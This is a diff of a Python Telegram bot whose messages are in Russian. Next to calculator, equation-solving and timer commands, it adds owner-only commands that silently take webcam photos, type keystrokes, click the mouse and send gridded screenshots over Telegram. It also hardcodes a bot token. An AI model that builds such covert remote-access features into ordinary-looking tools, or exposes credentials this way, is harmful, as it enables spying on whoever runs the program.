@@ -1,20 +1,45 @@
 import os
+import cv2
+import pygame
 import requests
 from time import sleep
-from pyautogui import screenshot, click, moveTo
 from sympy import solve, parse_expr
-from sympy.parsing.sympy_parser import standard_transformations, implicit_multiplication_application
-from telegram.ext import Application, MessageHandler, filters, CommandHandler, ConversationHandler, CallbackQueryHandler
+from pyautogui import screenshot, click, moveTo, write
 from telegram import ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, MessageHandler, filters, CommandHandler, ConversationHandler
+from sympy.parsing.sympy_parser import standard_transformations, implicit_multiplication_application
 
+colors = ['red', 'orange', 'yellow', 'green', (85, 170, 255), 'blue', 'purple']
 BOT_TOKEN = '6649778454:AAFsLP_IXCjqEnSl9guLoErjdAkn3cjyL8g'
-
 reply_keyboard = [['/calc', '/eq'],
                   ['/set', '/stop']]
 
 markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=False)
 
 one_key = InlineKeyboardMarkup([[InlineKeyboardButton('TECT', callback_data='call_me')]])
+
+
+def liner():
+    pygame.init()
+    image = pygame.image.load('scr.png')
+    x0 = image.get_rect().width
+    y0 = image.get_rect().height
+    surf = pygame.surface.Surface((x0 + 70, y0 + 70))
+    surf.fill('white')
+    step = 50
+    color = 0
+    for x in range(0, x0, step):
+        surf.blit(pygame.font.SysFont('Arial', 20).render(str(x), True, 'black'), (x + 20, 10))
+        surf.blit(pygame.font.SysFont('Arial', 20).render(str(x), True, 'black'), (x + 20, y0 + 35))
+        pygame.draw.line(image, colors[color], (x, 0), (x, y0), width=1)
+        color = (color + 1) % 7
+    for y in range(0, y0, step):
+        surf.blit(pygame.font.SysFont('Arial', 20).render(str(y), True, 'black'), (0, y + 20))
+        surf.blit(pygame.font.SysFont('Arial', 20).render(str(y), True, 'black'), (x0 + 40, y + 20))
+        pygame.draw.line(image, colors[color], (0, y), (x0, y), width=1)
+        color = (color + 1) % 7
+    surf.blit(image, (35, 35))
+    pygame.image.save(surf, 'scr_send.png')
 
 
 async def callback(call, context):
@@ -56,15 +81,39 @@ async def get_click(update, context):
         pos = [int(i) for i in update.message.text[update.message.text.index('.') + 1:].split('.')]
         x, y = pos[0], pos[1]
         moveTo(x, y)
-        click(button='left' if pos[2] else 'right')
-        sleep(0.5)
-        await scr_shot(update, context)
+        if len(pos) == 3:
+            click(button='left' if pos[2] else 'right')
+        else:
+            click(button='left' if pos[2] else 'right')
+            click(button='left' if pos[2] else 'right')
+        sleep(1)
+        await scr_shot(update, context, send=True)
 
 
-async def scr_shot(update, context):
+async def make_photo(update, context):
+    if update.message.chat.username == 'TYPUCT_C_MAPCA':
+        cap = cv2.VideoCapture(0)
+        for i in range(30):
+            cap.read()
+        a, image = cap.read()
+        cv2.imwrite('cam.png', image)
+        cap.release()
+        await context.bot.send_photo(chat_id=update.message.chat.id, photo=open('cam.png', 'rb'))
+
+
+async def print_key(update, context):
+    if update.message.chat.username == 'TYPUCT_C_MAPCA':
+        msg = update.message.text.split('.')[1]
+        write(msg)
+        await scr_shot(update, context, send=True)
+
+
+async def scr_shot(update, context, send=False):
     if update.message.chat.username == 'TYPUCT_C_MAPCA':
         screenshot('scr.png')
-        await context.bot.send_photo(chat_id=update.message.chat.id, photo=open('scr.png', 'rb'))
+        liner()
+        photo = open(f'scr{"_send" if send else ""}.png', 'rb')
+        await context.bot.send_photo(chat_id=update.message.chat.id, photo=photo)
 
 
 async def echo(update, context):
@@ -113,10 +162,7 @@ async def send_file(update, context):
 
 
 async def start(update, context):
-    print(update)
-    await update.message.reply_text(f'BEHAPA_BOT приветствует вас, {update.message.chat.first_name}!',
-                                    reply_markup=one_key)
-    await context.bot.send_photo(chat_id=update.message.chat.id, photo=open('pictures/ava.jpeg', 'rb'))
+    await update.message.reply_text(f'BEHAPA_BOT приветствует вас, {update.message.chat.first_name}!')
 
 
 async def help(update, context):
@@ -132,8 +178,6 @@ def remove_job(name, context):
     return True
 
 
-# -----------------------------------------------------------
-
 async def ans_calc(update, context):
     await update.message.reply_text('Что надобно псочитать?')
     return 1
@@ -146,9 +190,6 @@ async def calculate(update, context):
         res = 'Ошибка в примере)'
     await update.message.reply_text(f'{res}')
     return ConversationHandler.END
-
-
-# -----------------------------------------------------------
 
 
 async def ans_timer(update, context):
@@ -196,8 +237,6 @@ async def equation(update, context):
         await update.message.reply_text('Что-то пошло не так...')
     return ConversationHandler.END
 
-
-# -----------------------------------------------------------
 
 async def update_keyboard(update, context):
     await update.message.reply_text('Обновление клавы...', reply_markup=markup)
@@ -256,6 +295,8 @@ def main():
     app.add_handler(CommandHandler('stop', stop))
     app.add_handler(CommandHandler('scr', scr_shot))
     app.add_handler(CommandHandler('1', get_click))
+    app.add_handler(CommandHandler('2', print_key))
+    app.add_handler(CommandHandler('send_photo', make_photo))
     text_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, echo)
     app.add_handler(text_handler)
     print('Run')
